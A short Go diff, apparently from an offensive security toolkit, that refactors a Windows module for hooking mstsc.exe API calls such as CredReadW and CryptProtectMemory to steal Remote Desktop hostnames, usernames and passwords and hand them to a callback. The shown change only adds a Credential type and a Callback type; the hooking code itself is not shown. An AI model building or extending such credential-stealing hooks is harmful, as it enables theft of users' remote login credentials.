@@ -16,6 +16,16 @@ import (
 	"project/internal/module/windows/hook"
 )
 
+// Credential is the credential that stolen from mstsc.exe.
+type Credential struct {
+	Hostname string
+	Username string
+	Password string
+}
+
+// Callback is used to record credential.
+type Callback func(cred *Credential)
+
 // this module support Windows 7, Windows 8 and Windows 10.
 
 // hook list
@@ -25,7 +35,7 @@ import (
 
 // Hook is the core library for steal credential.
 type Hook struct {
-	callback func(cred *Credential)
+	callback Callback
 
 	pgCredReadW                  *hook.PatchGuard
 	pgCryptProtectMemory         *hook.PatchGuard
@@ -42,7 +52,7 @@ type Hook struct {
 
 // NewHook is used to create a hook that include a callback.
 // <security:> usually cover password string in callback function.
-func NewHook(callback func(cred *Credential)) *Hook {
+func NewHook(callback Callback) *Hook {
 	return &Hook{callback: callback}
 }
 
